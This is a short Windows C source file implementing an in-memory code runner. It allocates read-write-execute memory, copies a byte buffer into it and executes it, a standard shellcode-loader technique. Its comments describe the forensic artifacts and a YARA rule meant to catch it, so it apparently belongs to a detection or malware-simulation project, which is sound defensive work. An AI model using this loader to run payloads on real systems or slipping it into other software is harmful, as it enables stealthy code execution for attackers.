/*
 * Memory Execution Implementation - Windows
 *
 * Uses VirtualAlloc with PAGE_EXECUTE_READWRITE for RWX allocation.
 * This is a common technique detectable via memory forensics.
 *
 * Detection artifact: RWX private allocation
 * Memory forensics: PE in unbacked memory (VAD analysis)
 * YARA signature target: stage1_imports.yar (VirtualAlloc)
 */

#ifdef _WIN32

#include "mem_exec.h"
#include <windows.h>
#include <string.h>

int mem_run(const uint8_t *code, size_t len)
{
    if (!code || len == 0) {
        return -1;
    }

    /*
     * Allocate RWX memory.
     * PAGE_EXECUTE_READWRITE is suspicious and detectable.
     */
    void *mem = VirtualAlloc(
        NULL,
        len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!mem) {
        return -1;
    }

    /* Copy code to executable memory */
    memcpy(mem, code, len);

    /* Cast to function pointer and call */
    void (*entry)(void) = (void (*)(void))mem;
    entry();

    /* If we return, free and succeed */
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

#endif /* _WIN32 */
